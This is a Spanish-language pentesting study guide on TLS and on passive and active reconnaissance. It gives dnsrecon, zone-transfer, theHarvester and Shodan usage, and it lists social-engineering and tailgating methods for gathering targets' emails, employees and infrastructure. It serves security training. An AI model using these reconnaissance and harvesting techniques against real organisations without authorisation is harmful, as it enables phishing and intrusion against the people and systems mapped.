+<p><b>TLS El protocolo (Transport Layer Security)</b>: TLS (Transport Layer Security) es el protocolo criptográfico que reemplazó a SSL y hoy es el estándar para proteger las comunicaciones en Internet. La versión más reciente, TLS 1.3, ofrece mayor seguridad y menor latencia, siendo la base de HTTPS y de servicios como correo electrónico y VoIP. </p>
+
+
+<p> TLS opera entre las capas de transporte y aplicación </p>
+
+
+
+<h3> Certificado de confianza TLS </h3>
+
+<p> Es el mecanismo que permite a un navegador verificar que un servidor web es auténtico y que la conexión está protegida. Funciona gracias a la infraestructura de clave pública (PKI) y a las autoridades certificadoras (CA) que emiten certificados digitales.</p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/7Lb9DLmV/311.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p> En la figura anterior, es visible la siguiente información: </p>
+
+<p>1. ¿A quién se expide el certificado? Este es el nombre de la empresa que utilizará este certificado. </p>
+<p>2. ¿Quién emitió el certificado? Esta es la autoridad certificadora que emitió este certificado.</p>
+<p>3. Periodo de validez. No se debe confiar en un certificado caducado.</p>
+
+
+
+<h3> 🔐 Funcionamiento de un certificado TLS </h3>
+
+<p> 1. Emisión por una CA: una autoridad certificadora valida la identidad del propietario del dominio y emite un certificado digital firmado.</p>
+
+<p> 2. Instalación en el servidor: el certificado se configura en el servidor web para habilitar conexiones HTTPS.</p>
+
+<p> 3. Handshake TLS: cuando un cliente se conecta, el servidor envía su certificado.</p>
+
+<p> 4. Verificación del navegador: el navegador comprueba que el certificado fue emitido por una CA confiable y que no está caducado ni revocado.</p>
+
+<p> 5. Establecimiento de clave de sesión: se negocia una clave simétrica única para cifrar la comunicación.</p>
+
+<p> 6. Transmisión segura: todos los datos posteriores viajan cifrados, garantizando confidencialidad e integridad.</p>
+
+
+
+
+<h3> Evaluar configuraciones TLS </h3>
+
+
+
+<p> :radio_button: <b> testssl.sh:</b> una herramienta de línea de comandos que verifica el funcionamiento de un servidor TLS configuración para protocolos compatibles, conjuntos de cifrado y vulnerabilidades comunes. Es la mejor opción para realizar evaluaciones detalladas, especialmente en sistemas internos que no son de acceso público. </p>
+
+<p> :radio_button: <b> sslyze:</b> una herramienta de Python para analizar SSL/TLS configuraciones, útiles para la automatización y la integración CI/CD canalizaciones. </p>
+
+<p> :radio_button: <b> SSL Labs (ssllabs.com):</b> un servicio basado en web que proporciona un análisis detallado de servidores HTTPS públicos. Es la opción más rápida para una evaluación única de un sitio web público.</p>
+
+<p> :radio_button: <b> nmap cifrados de enumeración SSL:</b> un Mapa Nscript que enumera conjuntos de cifrado compatibles como parte de un escaneo de puertos más amplio. </p>
+
+
+
+
+
+
+<!----------------------------------------------------------------------------- Reconocimiento de Dominios ----------------------------------------------------------------------------->
+
+
+<h2> :arrow_right: Reconocimiento de DNS </h2>
+
+
+<p> El objetivo principal del reconocimiento de DNS es mapear la infraestructura de red del objetivo a través de sus registros DNS. </p>
+
+
+ <h2> :white_check_mark: &nbsp; DNS recon </h2>
+
+
+<p> DNSRecon es una herramienta de enumeración DNS escrita en Python. Esta herramienta es utilizada principalmente para recopilar información sobre los registros DNS de un dominio específico, lo cual es una práctica común en pruebas de penetración y evaluaciones de seguridad. DNSRecon puede realizar una variedad de tareas, incluyendo: </p>
+
+
+<p> • Transferencias de Zona: Verifica si los servidores de nombres (NS) permiten transferencias de zona, lo que podría revelar información sensible.</p>
+<p> • Enumeración de Registros DNS: Recopila registros DNS comunes como MX (servidores de correo), SOA (inicio de autoridad), NS (servidores de nombres), A (direcciones IPv4), AAAA (direcciones IPv6), SPF (política de remitente) y TXT.</p>
+<p> • Enumeración de Registros SRV: Busca registros SRV que indican servicios disponibles como LDAP, SIP, etc.</p>
+<p> • Expansión de TLD: Realiza búsquedas para dominios con diferentes extensiones de nivel superior (TLD).</p>
+<p> • Resolución de Caracteres Comodín: Detecta si un dominio utiliza resolución de caracteres comodín.</p>
+<p> • Fuerza Bruta de Subdominios: Utiliza listas de palabras para descubrir subdominios y hosts existentes.</p>
+<p> • Búsqueda de Registros PTR: Realiza búsquedas inversas de DNS para rangos IP o CIDR.</p>
+<p> • Verificación de Registros en Caché: Examina los registros en caché de un servidor DNS para encontrar registros A, AAAA y CNAME.</p>
+
+
+<h4>Enumeración General de Registros DNS:</h4>
+
+<p>Comando: dnsrecon -d [dominio]:</p>
+
+<p>Recopila información general sobre los registros DNS del dominio especificado (MX, SOA, NS, A, AAAA, SPF, TXT) consultando servidores DNS públicos</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/J4FJMKVv/23.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p> SOA:&nbsp; Muestra el servidor DNS autoritativo de inicio (nsztm1.digi.ninja) y detalles de configuración.  </p>
+<p> NS:&nbsp; Lista los servidores de nombres autoritativos para el dominio (nsztm1.digi.ninja, nsztm2.digi.ninja). </p>
+<p> MX:&nbsp; Muestra los servidores de correo.  </p>
+<p> A:&nbsp; Dirección IPv4 asociada al dominio (5[.]196[.]105[.]14). </p>
+<p> AAAA:&nbsp; Dirección IPv6 asociada al dominio </p>
+<p> TXT:&nbsp; Registros de texto, en este caso contiene una política SPF. </p>
+
+
+<h4>Enumeración de Registros SRV:</h4>
+
+<p>Comando: dnsrecon -d [dominio] -t srv </p> 
+<p>Busca registros SRV comunes relacionados con servicios como LDAP, SIP, Kerberos, XMPP (mensajería) Etc consultando servidores DNS </p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/WpGT21B5/24.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p> El dominio zonetransfer.me tiene un servicio SIP (VoIP)   </p>
+
+
+<h4>Transferencia de Zona (Contexto Pasivo):</h4>
+
+
+<p>dnsrecon -d [dominio] -t axfr: Una transferencia de zona es un mecanismo legítimo en DNS que permite a un servidor DNS secundario copiar (sincronizar) todos los registros de un dominio desde el servidor DNS primario. Esto es crucial para redundancia y resiliencia del servicio DNS.
+
+El proceso AXFR implica que un servidor DNS solicite al servidor primario una copia completa de todos los registros DNS del dominio (A, AAAA, MX, NS, TXT, CNAME, SRV, etc.). Esta solicitud se hace mediante una consulta especial llamada AXFR
+
+</p>
+
+
+<p> ¿Qué hace este comando?</p>
+
+<p> 1) &nbsp; Identificación de servidores de nombres (NS)&nbsp; : Primero, DNSRecon consulta los registros NS del dominio  para conocer cuáles son los servidores DNS autoritativos </p>
+
+<p> 2) &nbsp; Intento de Transferencia de Zona: &nbsp; : DNSRecon intenta enviar una solicitud AXFR directamente a cada uno de esos servidores de nombres (NS) identificados</p>
+
+
+<p> 3) &nbsp; Interacción con el objetivo &nbsp; : las solicitudes AXFR son enviadas directamente al servidor DNS objetivo.La mayoría de los servidores DNS modernos tienen configuraciones de seguridad que rechazan transferencias de zona provenientes de direcciones IP no autorizadas (normalmente solo se permite desde IPs de servidores secundarios confiables). Sin embargo, si el servidor tiene una configuración incorrecta o insegura y acepta la solicitud AXFR desde la IP del atacante (o desde donde se ejecute dnsrecon), entonces entregará toda la zona DNS del dominio.</p>
+
+
+<p> 4) &nbsp; Recopilación de datos: &nbsp; : Si la transferencia es exitosa, el atacante obtiene una lista exhaustiva de todos los registros DNS del dominio, lo que representa una filtración de información interna muy valiosa.</p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/W3LpnWqP/25.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/2yTzCCc8/26.png" alt="Descripción de la imagen">
+
+</p>
+
+<p> CNAME:&nbsp;  sirve para crear un alias entre nombres de dominio, redirigiendo un subdominio hacia otro dominio canónico. No apunta a direcciones IP, sino a 
+nombres de dominio. </p>
+<p> SRV y NAPTR:&nbsp; Indican servicios como SIP (_sip._tcp) y correo electrónico, útiles para VoIP y descubrimiento de servicios. </p>
+<p> HINFO::&nbsp; Describe el sistema operativo y hardware (Windows XP y Casio fx-7000G). </p>
+<p> RP:&nbsp; Persona responsable </p>
+<p> LOC::&nbsp; Coordenadas geográficas </p>
+<p> AAAA:&nbsp; Dirección IPv6 asociada al dominio </p>
+<p> CERT y DNSKEY &nbsp; Información criptográfica para validación DNSSEC. </p>
+
+
+<h2> :white_check_mark: &nbsp;  DNSDumpster </h2>
+
+
+<p> DNSDumpster es una herramienta gratuita en línea diseñada para la recopilación de información (reconocimiento) de dominios. Es muy utilizada en pruebas de penetración y evaluaciones de seguridad para obtener datos sobre la infraestructura DNS de un dominio específico. </p>
+
+
+
+<p> • Búsqueda de registros DNS: Permite encontrar registros como A, MX, NS, TXT, SOA y más relacionados con un dominio.</p>
+<p> • Búsqueda de hosts relacionados: Identifica direcciones IP y hosts que están conectados al dominio.</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/V65zFx4p/27.png" alt="Descripción de la imagen">
+
+</p>
+
+<p> • Detección de subdominios: Recopila y muestra subdominios asociados al dominio principal.</p>
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/Hk2JvC4z/28.png" alt="Descripción de la imagen">
+
+</p>
+
+<p> • Mapeo gráfico: Genera un diagrama visual de la infraestructura del dominio, incluyendo servidores y subdominios relacionados.</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/d1QhcN6p/29.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<!----------------------------------------------------------------------------- Reconocimiento de Subdominios ----------------------------------------------------------------------------->
+
+
+<h2> :arrow_right: Reconocimiento de subdominios </h2>
+
+
+<p> La enumeración de subdominios consiste en encontrar subdominios válidos para un dominio, pero ¿por qué lo hacemos? Lo hacemos para ampliar nuestra superficie de ataque y descubrir más puntos de vulnerabilidad potenciales.</p>
+
+
+
+<h3> :white_check_mark: &nbsp; OSINT - Certificados SSL/TLS </h3>
+
+
+<p> Los Certificados SSL/TLS son archivos digitales que autentican la identidad de un sitio web y cifran la comunicación entre el navegador y el servidor usando protocolos de seguridad (SSL = Secure Sockets Layer, TLS = Transport Layer Security).</p>
+
+<p> El propósito de los registros de Transparencia de Certificados es impedir el uso de certificados maliciosos o creados accidentalmente. Podemos aprovechar este servicio para descubrir subdominios que pertenecen a un dominio.</p>
+
+
+
+<h4>  &nbsp;  crt.sh - La Mina de Oro de Subdominios "https://crt.sh/" </h4>
+
+<p> crt.sh es un motor de búsqueda público que indexa TODOS los certificados SSL/TLS emitidos por Certificadoras Públicas (CAs) desde 2013. Contiene +1 billón de certificados y es 100% pasivo.</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/G3yn11X5/66.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<h2> :white_check_mark: &nbsp; OSINT - Motores de búsqueda  </h2>
+
+
+<p> Usar métodos de búsqueda avanzados en sitios web como Google, como [nombre del dominio] site: filter, puede restringir los resultados. Por ejemplo, [ site:*.domain.com -site:www.domain.com nombre del dominio] solo contendría resultados que dirigieran al nombre de dominio dominio.com, pero excluiría cualquier enlace a www.dominio.com; por lo tanto, solo nos muestra los subdominios que pertenecen a dominio.com.</p>
+
+<p> Ejemplo practico</p>
+
+
+<p> Utilice el término de búsqueda site:*.tryhackme.com -site:www.tryhackme.com, que debería revelar un subdominio para tryhackme.com</p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/Vv6Sdk5d/67.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<h2> :white_check_mark: &nbsp;  Enumeracion de subdominios con sublist3r </h2>
+
+
+<p> Sublist3r es una herramienta de Python diseñada para enumerar subdominios de sitios web mediante OSINT. Ayuda a los evaluadores de penetración y a los buscadores de errores a recopilar subdominios para el dominio objetivo. Sublist3r enumera subdominios utilizando diversos motores de búsqueda como Google, Yahoo, Bing, Baidu y Ask. También enumera subdominios utilizando Netcraft, Virustotal, ThreatCrowd, DNSdumpster y ReverseDNS.</p>
+
+<p> Subbrute se integró con Sublist3r para aumentar la posibilidad de encontrar más subdominios mediante fuerza bruta con una lista de palabras mejorada. El mérito es de TheRook, autor de Subbrute.</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/rmH29cVf/31.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/59nBhgTP/32.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p> Ejemplo 2</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/QxjcF4q5/68.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<!----------------------------------------------------------------------------- Otros metodos de reconocimiento pasivo ----------------------------------------------------------------------------->
+
+
+
+
+<h2> Otros metodos de reconocimiento pasivo </h2>
+
+
+
+<h3> 1. &nbsp;Identificar la direccion IP del sitio web o del servidor que aloja el sitio web </h3>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/6pHmdqv9/1.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p>En este caso, el sitio web tiene dos direcciones IPv4. Esto se debe a que está detrás de Cloudflare, que funciona como un proxy. Además, muestra las direcciones IPv6 y el servidor de correo asociado al dominio. </p>
+
+
+
+<h3>  2. &nbsp; Descargar el sitio WEB. Para analizar el codigo fuente </h3>
+
+
+<p> Es una técnica común en las pruebas de penetración (pentesting) durante la fase de reconocimiento y posterior análisis. Esta técnica implica obtener una copia local de los archivos que componen el sitio web objetivo. Al tener una copia local, el pentester puede inspeccionar minuciosamente el código fuente del lado del cliente y del servidor (si se obtiene) sin necesidad de interactuar constantemente con el servidor remoto, lo cual es más silencioso y eficiente para ciertos análisis.</p>
+
+
+ <h2>  HTTRack  </h2> 
+
+
+<p>Es un crawler especializado en replicar sitios web estáticos y semidinámicos, con soporte para filtros, reescritura de enlaces y control de recursos, lo que lo convierte en una herramienta técnica clave para archivado y análisis de infraestructura web. </p>
+
+
+<p> 1) &nbsp; Instalar HTTrack desde su página oficial httrack.com. disponible en Windows, linux, Andriod </p>
+<p> 2) &nbsp; Crear un proyecto: darle un nombre y elegir la carpeta donde se guardará. </p>
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/v8LZCGYd/11.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p> 3) &nbsp; Ingresar la URL del sitio que quieres descargar. </p>
+<p> 4) &nbsp; Configurar opciones: puedes limitar la profundidad del rastreo, excluir directorios o ajustar la velocidad. </p>
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/k4N7rydg/12.png" alt="Descripción de la imagen">
+
+</p>
+
+<p> 5) &nbsp; Iniciar la descarga: el programa copiará los archivos HTML, CSS, JS, imágenes y otros recursos. </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/cCY9kDyW/13.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p> 6) &nbsp; Navegar offline: abre el archivo index.html en tu navegador y explora el sitio como si estuvieras conectado. </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/yYV3rTGk/17.png" alt="Descripción de la imagen">
+
+</p>
+
+
+ <h2> 🛠 &nbsp; HDTrack </h2>
+
+<p> Es una herramienta de código abierto y gratuita que funciona como un navegador offline o copiador de sitios web. Su función principal es descargar un sitio web completo desde Internet y almacenarlo en tu computadora local. Lo hace descargando recursivamente todas las páginas, imágenes, archivos CSS, JavaScript, y otros recursos del sitio, recreando su estructura original en tu disco duro. </p>
+
+
+
+<h2> :arrow_right: Whois  </h2>
+
+
+<p>Los Whois son servicios y protocolos que permiten consultar información pública sobre dominios de internet, direcciones IP y recursos asociados en redes. Básicamente, funcionan como una base de datos global distribuida que almacena detalles registrales de dominios (como .com, .net, .org) y otros identificadores numéricos (ASNs o bloques IP). </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/fTXRwS0N/16.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<p>El comando whois es una herramienta esencial de línea de comandos utilizada para consultar las bases de datos WHOIS. Estas bases de datos contienen información registrada sobre los usuarios de recursos de Internet, principalmente nombres de dominio y direcciones IP.</p>
+
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/520KBLqF/15.png" alt="Descripción de la imagen">
+
+</p>
+ 
+<p> Servicios como whoxy.com proporcionan instantáneas históricas de WHOIS. Los datos históricos de WHOIS pueden revelar propietarios anteriores, cambios de registradores o migraciones de servidores de nombres que pueden indicar compromisos pasados o cambios de infraestructura..</p>
+
+
+
+<p> WHOIS será reemplazado por RDAP</p>
+
+
+<p> RDAP es el sucesor moderno: utiliza HTTPS (seguro), devuelve JSON estructurado (legible por máquina y consistente), admite la internacionalización, proporciona mejores controles de privacidad (acceso diferenciado) y se alinea con las reglas actuales de protección de datos</p>
+
+
+
+
+<h2> :arrow_right: Huella de sitio web con Netcraft </h2>
+
+<p>Netcraft es una herramienta de reconocimiento pasivo (también conocido como OSINT o Inteligencia de Fuentes Abiertas) increíblemente valiosa, ya que permite obtener una gran cantidad de información sobre el objetivo sin interactuar directamente con él. </p>
+
+<p> 1) Huella de Dominios y Subdominios (Footprinting)  </p>
+<p>    &nbsp; &nbsp;  • Identificar Servidores &nbsp; : Conocer qué servidor web (por ejemplo, Apache, Nginx, IIS) y qué sistema operativo se ha utilizado.</p>
+<p>    &nbsp; &nbsp;  • Historial de IP y Hosting &nbsp; : El historial de alojamiento puede revelar antiguas direcciones IP o proveedores de hosting. </p>
+<p>    &nbsp; &nbsp;  • Detección de Subdominios &nbsp; : Netcraft puede tener registros de subdominios que han sido alojados con el dominio principal </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/c1zwPR5N/18.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p> 2) Mapeo de Infraestructura y Redes </p>
+<p>    &nbsp; &nbsp;  • Propietario del Bloque de Red (Netblock Owner) y Rango de IPs: &nbsp; La identificación del propietario del bloque de red y de las direcciones IP de los servidores de destino ayuda a mapear la superficie de ataque de la organización</p>
+
+<p> 3) Identificación de Tecnologías (Fingerprinting) </p>
+<p>    &nbsp; &nbsp;  • Tecnologías de Frontend y Backend  &nbsp; : permite conocer tecnologías como sistemas de gestión de contenido (CMS como WordPress o Drupal), frameworks de desarrollo, tecnologías de analytics y otras librerías.</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/Wz0ZMKmr/22.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p>    &nbsp; &nbsp;  • Certificados SSL/TLS:  &nbsp; : Puede proporcionar información sobre el historial y la configuración actual de los certificados.</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/MKkbv0b2/19.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<p> 4) Detección de Phishing y Sitios Fraudulentos Anteriores  </p>
+<p>    &nbsp; &nbsp;  • puede indicar si el dominio objetivo o sus subdominios han sido comprometidos anteriormente o si han sido utilizados en ataques.</p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/zvkBD1Ss/20.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/XJLSpNmc/21.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+
+<h2> :white_check_mark: &nbsp; Deteccion WAF con wafw00f </h2>
+
+
+<p> Un WAF (Web Application Firewall) es un tipo de firewall diseñado específicamente para proteger aplicaciones web. Analiza el tráfico HTTP/HTTPS entrante y saliente entre el cliente y el servidor web, inspeccionando cada solicitud en busca de actividad maliciosa o comportamientos inusuales que puedan indicar un ataque. </p>
+
+
+<h2> 🛠 &nbsp; WAFW00F </h2>
+
+<p> Es una herramienta de código abierto diseñada específicamente para detectar y fingerprinting (identificación avanzada) de firewalls de aplicaciones web (WAF). Es una utilidad muy utilizada en pruebas de penetración y auditorías de seguridad web para identificar qué tipo de WAF está protegiendo una aplicación web objetivo. </p>
+
+
+
+<p> ¿Cómo funciona?</p>
+
+
+<p> • Envía una solicitud HTTP normal y analiza la respuesta; esto identifica una serie de soluciones WAF. </p>
+<p> • Si esto no tiene éxito, envía una serie de solicitudes HTTP (potencialmente maliciosas) y utiliza una lógica simple para deducir qué WAF es.</p>
+<p> • Si esto tampoco tiene éxito, analiza las respuestas devueltas previamente y utiliza otro algoritmo simple para adivinar si un WAF o una solución de seguridad está respondiendo activamente a nuestros ataques.</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/13sZ9vfn/30.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<h2> :arrow_right: Recoleccion de correo electronico con TheHarvester </h2>
+
+
+<p> Su función principal es recopilar información pública sobre un objetivo (dominio) desde múltiples fuentes externas. Es extremadamente útil para determinar la "superficie de ataque" de una organización antes de realizar escaneos directos. Recopila: </p>
+
+
+<p> • Correos electrónicos: Útiles para identificar usuarios y posibles vectores de phishing. </p>
+
+<p> • Subdominios y Hosts: Para descubrir activos web que no están a simple vista. </p>
+
+<p> • Nombres de empleados: Generalmente extraídos de redes como LinkedIn. </p>
+
+<p> • Direcciones IP: Para mapear la infraestructura del objetivo. </p>
+
+<p> • Virtual Hosts: Identificación de otros sitios alojados en el mismo servidor. </p>
+
+
+
+<p> sintaxis general es: theHarvester -d [dominio]  -l [limite]  -b [fuente] </p>
+
+
+<p> 1. Búsqueda en todas las fuentes disponibles </p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/Gm9ZpxFd/36.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/1XJjm84n/37.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p> ASNS: Identificador, permitirá asegurar que no estás escaneando accidentalmente IPs que pertenecen a otra organización </p>
+<p> URLs </p>
+<p> LinkedIn: Identifica empleados reales de la organización. </p>
+<p> IPs </p>
+<p> Emails: Da una lista de correos que podrían usarse para pruebas de ingeniería social o para identificar el formato de usuario </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/HskNS9PP/38.png" alt="Descripción de la imagen">
+
+</p>
+
+<p> Hosts: Revela subdominios que quizás no conocías, que suelen ser objetivos críticos. </p>
+
+
+<h2> :arrow_right: Bases de datos de contraseñas filtradas  </h2>
+
+
+<p> Have I Been Pwned (HIBP) es un servicio web gratuito y extremadamente confiable que permite a los usuarios e investigadores de seguridad verificar si sus cuentas o datos personales han sido expuestos en filtraciones de datos (data breaches) debido a hackeos en plataformas de terceros. </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/htv5nk6b/39.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p><b> :arrow_right:  • Informes disponibles públicamente: &nbsp;</b> Análisis de informes anuales, registros judiciales, comunicados de prensa, artículos de noticias y otros documentos disponibles públicamente.</b></p>
+
+<p><b> :arrow_right:  • Redes sociales: &nbsp;</b> Recopilación de información de plataformas de redes sociales.</b></p>
+
+</br>
+
+
+
+
+<h2> :white_check_mark: &nbsp; NSLOOKUP </h2>
+
+
+
+<p>Se utiliza para consultar servidores DNS y obtener información sobre registros de dominio. Es una herramienta fundamental en redes y ciberseguridad.</p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/3xpKRGKB/222.png" alt="Descripción de la imagen">
+
+</p>
+
+<p>En ciberseguridad, nslookup se usa en la fase de reconocimiento (OSINT) para</p>
+
+
+<p> Descubrir subdominios mediante consultas de transferencia de zona (si el servidor DNS lo permite)</p>
+<p> Encontrar servidores de correo para posibles ataques de phishing o spoofing/p>
+<p> Identificar servidores DNS internos/externos</p>
+<p> Recolectar información sobre la infraestructura del objetivo</p>
+
+
+<p>Aunque sigue siendo útil, herramientas más modernas como dig (Domain Information Groper) ofrecen más flexibilidad y detalles, y son preferidas en entornos Linux/Kali para auditorías más profundas.</p>
+
+
+</br>
+
+
+
+<h2> :white_check_mark: &nbsp; SHODAN </h2>
+
+
+
+<p>Shodan es un motor de búsqueda especializado que indexa dispositivos conectados a internet (servidores, IoT equipos, cámaras, enrutadores, sistemas de control industrial y más), a diferencia de Google que indexa páginas web. Escanea constantemente todas las direcciones IP del mundo y almacena información sobre los servicios, banners y respuestas que recibe de los puertos abiertos.</p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/Y9jDrJgC/223.pngr" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<p>La pagina da como resultado una lista de Host coincidentes</p>
+
+<p><b> • Dirección IP y ASN: </b> &nbsp; identifica el bloque de red.</p>
+<p><b> • Proveedor/organización de alojamiento: </b> &nbsp; revela la infraestructura detrás del dominio. (por ejemplo, Cloudflare, AWS): </p>
+<p><b> • Ubicación geográfica:</b> &nbsp; ubicación física aproximada del servidor. </p>
+<p><b> • Puertos y servicios abiertos:</b> &nbsp; con cadenas de versiones y banners (por ejemplo, tipo y versión del servidor HTTP).</p>
+<p><b> • Etiquetas:</b> &nbsp; comocdn ovuln si una vulnerabilidad conocida coincide con la versión del servicio detectada.</p>
+
+
+
+<h3> :radio_button: &nbsp; Filtros de búsqueda en Shodan </h3>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/VLPgpS7m/224.png" alt="Descripción de la imagen">
+
+</p>
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/MGHmV1GP/225.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+
+<h4> 🛠 &nbsp; Herramientas </h4>
+
+<p><b> • Descubrimiento de dominios:</b> &nbsp; crt.sh, dnsdumpster, subfinder, amass</p>
+<p><b> • Analizadores de Techstack:</b> &nbsp; Wappalyzer, BuiltWith, WhatRuns</p>
+<p><b> • Escáneres de Internet:</b> &nbsp; Shodan, Censys, Netlas, Greynoise</p>
+<p><b> • Archivos web:</b> &nbsp; Wayback Machine, Common Crawl</p>
+<p><b> • Motores de búsqueda:</b> &nbsp; Google, Bing, DuckDuckGo, Brave, Yandex, Baidu, Google Dork, Google Hacking database, shodan</p>
+<p><b> • Rastreador web</b> &nbsp; Netcraft, Whois </p>
+<p><b> • Comandos</b> &nbsp; Nslookup, hping </p>
+
+</br>
+
+<!-------------------------------------- ## FASE 1 Reconocimiento Activo --------------------------------------------->
+
+
+
+</br>
+
+
+<div id="user-content-toc">
+  <ul align="right">
+    <summary><a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=50&pause=1000&color=2C6ED4&width=700&height=350&lines=Reconocimiento+Activo" alt="Typing SVG" /></a></summary>
+  </ul>
+</div>
+
+
+</br>
+
+
+
+<h2> 👨🏻‍💻 (Implica interacción directa con el objetivo) </h2>
+
+
+
+
+</br>
+
+
+<p> El descubrimiento activo (active discovery) es una fase clave en las pruebas de penetración (pentesting) y evaluaciones de seguridad, donde se envían paquetes o solicitudes reales a los sistemas objetivo para mapear y recopilar información sobre la red, hosts, servicios y vulnerabilidades. </p>
+
+
+<p> :white_check_mark: Técnicas comunes: </p>
+
+<p><b> • &nbsp; Conocer la infraestructura interna de una red u organización </b></p>
+<p><b> • &nbsp; Descubrimiento de puertos abiertos </b>  </p>
+<p><b> • &nbsp; Enumeracion de la informacion del sistema objetivo </b></p>
+<p><b> • &nbsp; Interactuar con aplicaciones web o API  </b></p>
+<p><b> • &nbsp; Ingeniería social (phishing, vishing, pretexto para hacer llamadas telefónicas) </b></p>
+<p><b> • &nbsp; Enfoques físicos (tailgating, hacerse pasar por un proveedor). </b></p>
+
+
+
+
+<p> Recopilar información interactuando directamente con el objetivo (envío de paquetes, solicitudes, etc.)  </p>
+
+</br>
+
+<p> • Puede ser detectado por el objetivo (deja rastro en logs).</p>
+<p> • Se enfoca en descubrir sistemas, servicios abiertos, topología de red, etc.</p>
+
+</br>
+
+
+<h2> :white_check_mark: Metodos </h2>
+
+
+</br>
+
+<p><b> • Barrido de ping :</b></p>  
+<p> Envío de solicitudes de eco ICMP para identificar hosts activos.</p>
+		
+<p><b> • Escaneo de puertos:</b></p>
+<p>	Uso de herramientas para escanear la infraestructura de destino para identificar puertos abiertos/sin filtrar y los servicios que se ejecutan en ellos.</p>
+		
+<p><b> • Tracerout:</b></p>
+<p> Mapeo de la ruta que siguen los paquetes para llegar al destino. Esto nos ayuda a identificar otros sistemas y controles implementados, lo que nos permite comprender mejor la red.</p>
+	
+<p><b> • Huella digital de servicio:</b></p>
+<p> Identificación de las versiones específicas de los servicios que se ejecutan en puertos abiertos.</p>
+	
+			
+<p><b> • Captura de banners:</b></p> 
+<p> Captura de la respuesta inicial de los servicios para recopilar información sobre las versiones y configuraciones del software.</b>
+	
+
+</br>
+
+
+<p><b> El reconocimiento activo es detectable (IDS/IPS, WAFs, registro), conlleva un mayor riesgo de alertar al objetivo </b></p>
+
+<!----------------------------------------------------------------------------- Reconocimiento activo de DNS ----------------------------------------------------------------------------->
+
+
+<h2> :arrow_right: Transferencias de zona DNS </h2>
+
+
+<p> Una transferencia de zona DNS es un mecanismo del protocolo DNS (AXFR - Authoritative Zone Transfer o IXFR - Incremental) donde un servidor DNS secundario solicita y recibe una copia completa de la zona DNS (archivo maestro) desde el servidor primario. Contiene todos los registros DNS (A, MX, CNAME, TXT, etc.) de un dominio.</p>
+
+
+<p> ¡Una sola transferencia puede revelar 80% de tu ataque vectorizado! Ejecuta primero, analiza después.</p>
+
+<p> Nota: Si se deja mal configurado y sin seguridad, los atacantes pueden abusar de ellos pra copiar el archivo de zona del DNS principal de un servidor a otro servidor esto proporcionara una vision holistica de la red de una organizacion</p>
+
+
+
+Registros DNS
+
+<p> + A - &nbsp; Resuelve un nombre de host o dominio a una dirección IPv4.</p>
+<p> + AAAA - &nbsp; Resuelve un nombre de host o dominio en una dirección IPV6.</p>
+<p> + NS - &nbsp; Referencia al servidor de nombres del dominio.</p>
+<p> + MX - &nbsp; Resuelve un dominio a un servidor de correo.</p>
+<p> + CNAME - &nbsp; Usado para alias de dominio.</p>
+<p> + TXT - &nbsp; Texto record.</p>
+<p> + HINFO - &nbsp; Información del anfitrión.</p>
+<p> + SOA - &nbsp; Autoridad de dominio.</p>
+<p> + SRV - &nbsp; Registros de servicio.</p>
